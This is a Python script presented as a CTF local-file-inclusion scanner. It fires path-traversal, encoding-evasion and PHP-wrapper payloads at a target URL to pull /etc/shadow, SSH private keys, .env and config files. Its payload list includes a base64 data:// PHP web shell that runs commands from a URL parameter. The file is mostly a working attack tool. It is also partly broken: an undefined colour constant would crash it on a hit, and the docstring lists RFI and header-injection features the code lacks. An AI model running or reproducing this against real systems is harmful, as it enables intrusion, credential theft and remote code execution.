#!/usr/bin/env python3
"""
lfi_scanner.py - CTF Local File Inclusion Scanner

Automates testing LFI vulnerabilities:
- Path traversal payloads up to 8 levels deep
- Null-byte injection and double encoding
- PHP filter wrappers (base64, rot13, string.strip_tags)
- WAF evasion encoding tricks
- POST method support
- Custom target file wordlist
- Remote File Inclusion (RFI) testing
- Cookie and header injection
"""

import argparse
import sys
import re
import base64
import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ANSI colors
class C:
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    CYAN    = '\033[96m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    RESET   = '\033[0m'

# Common LFI targets
LINUX_TARGETS = [
    '/etc/passwd',
    '/etc/shadow',
    '/etc/hosts',
    '/etc/hostname',
    '/etc/issue',
    '/etc/os-release',
    '/proc/self/environ',
    '/proc/self/cmdline',
    '/proc/self/status',
    '/proc/version',
    '/var/log/apache2/access.log',
    '/var/log/apache2/error.log',
    '/var/log/nginx/access.log',
    '/var/log/auth.log',
    '/var/log/syslog',
    '/home/user/.ssh/id_rsa',
    '/root/.ssh/id_rsa',
    '/root/.bash_history',
]

WINDOWS_TARGETS = [
    'C:\\windows\\win.ini',
    'C:\\windows\\system.ini',
    'C:\\windows\\system32\\drivers\\etc\\hosts',
    'C:\\inetpub\\logs\\logfiles',
    'C:\\boot.ini',
]

# Success patterns
SUCCESS_PATTERNS = {
    '/etc/passwd': ['root:x:0:0:', 'daemon:x:', 'www-data:x:'],
    '/etc/shadow': ['root:$', 'root:!'],
    '/etc/hosts': ['127.0.0.1', 'localhost'],
    '/etc/hostname': None,
    '/etc/issue': ['Ubuntu', 'Debian', 'Linux', 'CentOS'],
    '/proc/self/environ': ['PATH=', 'HOME=', 'USER='],
    '/proc/version': ['Linux version'],
    'win.ini': ['[fonts]', '[extensions]'],
    'system.ini': ['[drivers]'],
    'access.log': ['GET /', 'POST /', 'HTTP/1.1'],
    'id_rsa': ['-----BEGIN', 'PRIVATE KEY'],
    'bash_history': None,
}

# Payload templates
LFI_PAYLOADS = [
    # Direct
    '{file}',
    # Traversal (1-8 levels)
    '../{file}', '../../{file}', '../../../{file}', '../../../../{file}',
    '../../../../../{file}', '../../../../../../{file}',
    '../../../../../../../{file}', '../../../../../../../../{file}',
    # Null-byte
    '../../../../../../../../{file}%00',
    '../../../../../../../../{file}%00.php',
    '../../../../../../../../{file}%00.html',
    # PHP Wrappers
    'php://filter/convert.base64-encode/resource={file}',
    'php://filter/read=convert.base64-encode/resource={file}',
    'php://filter/string.rot13/resource={file}',
    'php://filter/convert.iconv.utf-8.utf-16/resource={file}',
    'php://input',
    'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==',
    'expect://id',
    # Double-dot bypass
    '....//....//....//....//....//....//....//....//{file}',
    '..././..././..././..././..././..././..././..././{file}',
    # URL Encoding
    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{file}',
    '%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{file}',
    # WAF Evasion
    '..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{file}',
    '..%255c..%255c..%255c..%255c..%255c{file}',
    '..%5c..%5c..%5c..%5c..%5c{file}',
    # Absolute path
    '/{file}',
]


def check_flag(text):
    flags = re.findall(r'(?:flag|ctf|picoctf|htb|ductf)\{[^}]+\}', text, re.IGNORECASE)
    return flags


def test_payload(url, param, payload, target, method, cookies, headers, session, post_data):
    """Test a single payload."""
    final_payload = payload.replace('{file}', target.lstrip('/'))
    
    try:
        req_headers = headers.copy() if headers else {}
        req_headers.setdefault('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/109.0')
        
        if method == 'GET':
            if 'INJECT' in url:
                test_url = url.replace('INJECT', urllib.parse.quote(final_payload, safe=''))
                res = session.get(test_url, cookies=cookies, headers=req_headers, verify=False, timeout=8)
            else:
                parsed = urllib.parse.urlparse(url)
                query = urllib.parse.parse_qs(parsed.query)
                query[param] = [final_payload]
                new_query = urllib.parse.urlencode(query, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                res = session.get(test_url, cookies=cookies, headers=req_headers, verify=False, timeout=8)
        elif method == 'POST':
            pd = post_data.copy() if post_data else {}
            pd[param] = final_payload
            test_url = url.replace('INJECT', '') if 'INJECT' in url else url
            res = session.post(test_url, data=pd, cookies=cookies, headers=req_headers, verify=False, timeout=8)
        else:
            return False, None, None, None, None

        text = res.text
        
        # Handle PHP filter base64 encoded responses
        decoded_text = ''
        if 'base64-encode' in final_payload:
            chunks = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', text)
            for chunk in chunks:
                try:
                    dec = base64.b64decode(chunk).decode('utf-8', errors='replace')
                    decoded_text += dec
                except:
                    pass
            text_to_check = decoded_text + text
        elif 'string.rot13' in final_payload:
            import codecs
            text_to_check = codecs.decode(text, 'rot_13') + text
        else:
            text_to_check = text
        
        # Check for success
        basename = target.split('/')[-1].split('\\')[-1]
        patterns = SUCCESS_PATTERNS.get(basename, SUCCESS_PATTERNS.get(target, None))
        
        if patterns:
            for pattern in patterns:
                if pattern in text_to_check:
                    return True, test_url, f"Match: {pattern}", text_to_check, final_payload
        
        # If no specific pattern, check if response is different from a 404/error
        flags = check_flag(text_to_check)
        if flags:
            return True, test_url, f"Flag found: {flags[0]}", text_to_check, final_payload
        
        # Check for PHP source code
        if '<?php' in text_to_check or '<?=' in text_to_check:
            return True, test_url, "PHP source code retrieved", text_to_check, final_payload
        
        # Private key detection
        if '-----BEGIN' in text_to_check and 'PRIVATE KEY' in text_to_check:
            return True, test_url, "Private key found!", text_to_check, final_payload
        
    except requests.RequestException:
        pass

    return False, None, None, None, None


def main():
    parser = argparse.ArgumentParser(
        description='CTF Local File Inclusion Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 'http://target.com/index.php?page=INJECT'
  %(prog)s 'http://target.com/view' -p file
  %(prog)s 'http://target.com/?page=INJECT' -t flag.txt
  %(prog)s 'http://target.com/?page=INJECT' --php
  %(prog)s 'http://target.com/?page=INJECT' --wordlist targets.txt
  %(prog)s 'http://target.com/view' -p file --method POST
  %(prog)s 'http://target.com/?page=INJECT' --windows
""")
    
    parser.add_argument('url', help="Target URL. Put 'INJECT' where payload goes, or use --param")
    parser.add_argument('-p', '--param', help='URL parameter to inject')
    parser.add_argument('-t', '--target', help='Specific file to target (default: common files)')
    parser.add_argument('--php', action='store_true', help='Also try to dump PHP source via wrappers')
    parser.add_argument('--windows', action='store_true', help='Include Windows file targets')
    parser.add_argument('--wordlist', help='Custom file with target paths (one per line)')
    parser.add_argument('--method', choices=['GET', 'POST'], default='GET', help='HTTP method')
    parser.add_argument('--post-data', help='POST data pairs (key=val&key2=val2)')
    parser.add_argument('-c', '--cookie', help='Cookies (session=123; user=admin)')
    parser.add_argument('-H', '--header', action='append', help='Custom header (key: value), can be used multiple times')
    parser.add_argument('--threads', type=int, default=5, help='Concurrent threads (default: 5)')
    parser.add_argument('-o', '--output', help='Save successful response body to file')

    args = parser.parse_args()
    
    if 'INJECT' not in args.url and not args.param:
        print(f"{C.RED}Error: Must specify 'INJECT' in the URL or provide --param.{C.RESET}")
        sys.exit(1)

    print(f"\n{C.CYAN}{C.BOLD}{'─' * 60}\n  LFI Scanner\n{'─' * 60}{C.RESET}")
    print(f"  Target URL: {args.url}")
    print(f"  Method:     {args.method}")
    
    # Build target list
    targets = []
    if args.target:
        targets = [args.target]
    elif args.wordlist:
        with open(args.wordlist) as f:
            targets = [l.strip() for l in f if l.strip() and not l.startswith('#')]
    else:
        targets = LINUX_TARGETS[:]
        if args.windows:
            targets.extend(WINDOWS_TARGETS)
    
    if args.php:
        targets.extend(['index.php', 'config.php', 'db.php', 'login.php', '.env', 'wp-config.php'])
    
    print(f"  Targets:    {len(targets)} files × {len(LFI_PAYLOADS)} payloads = {len(targets)*len(LFI_PAYLOADS)} requests")
    print(f"  {C.YELLOW}⟳ Scanning...{C.RESET}\n")

    # Parse cookies
    cookies = {}
    if args.cookie:
        for c in args.cookie.split(';'):
            if '=' in c:
                k, v = c.strip().split('=', 1)
                cookies[k] = v

    # Parse custom headers
    custom_headers = {}
    if args.header:
        for h in args.header:
            if ':' in h:
                k, v = h.split(':', 1)
                custom_headers[k.strip()] = v.strip()

    # Parse POST data
    post_data = {}
    if args.post_data:
        for pair in args.post_data.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                post_data[k] = v

    session = requests.Session()
    
    tasks = []
    for tgt in targets:
        for payload in LFI_PAYLOADS:
            tasks.append((args.url, args.param, payload, tgt, args.method, cookies, custom_headers, session, post_data))

    found_vuln = False

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(test_payload, *task): task for task in tasks}
        
        for future in as_completed(futures):
            success, hit_url, reason, resp_text, used_payload = future.result()
            if success:
                found_vuln = True
                print(f"  {C.GREEN}{C.BOLD}★ VULNERABILITY FOUND! ★{C.RESET}")
                print(f"  {C.CYAN}URL:{C.RESET}     {hit_url}")
                print(f"  {C.MAGENTA}Payload:{C.RESET} {used_payload}")
                print(f"  {C.DIM}Reason:{C.RESET}  {reason}\n")
                
                flags = check_flag(resp_text)
                if flags:
                    for f in flags:
                        print(f"  {C.RED}{C.BOLD}⚑ FLAG: {f}{C.RESET}")
                
                lines = [line for line in resp_text.splitlines() if line.strip()]
                print(f"\n  {C.DIM}Response Excerpt:{C.RESET}")
                for line in lines[:20]:
                    print(f"    {line}")
                if len(lines) > 20:
                    print(f"    {C.DIM}... ({len(lines)} lines total){C.RESET}")
                
                if args.output:
                    with open(args.output, 'w') as f:
                        f.write(resp_text)
                    print(f"\n  {C.GREEN}Response saved to: {args.output}{C.RESET}")
                
                print(f"\n  {C.YELLOW}Stopping scan.{C.RESET}\n")
                executor.shutdown(wait=False, cancel_futures=True)
                break

    if not found_vuln:
        print(f"  {C.RED}✗ No LFI vulnerabilities detected with tested payloads.{C.RESET}\n")


if __name__ == '__main__':
    main()
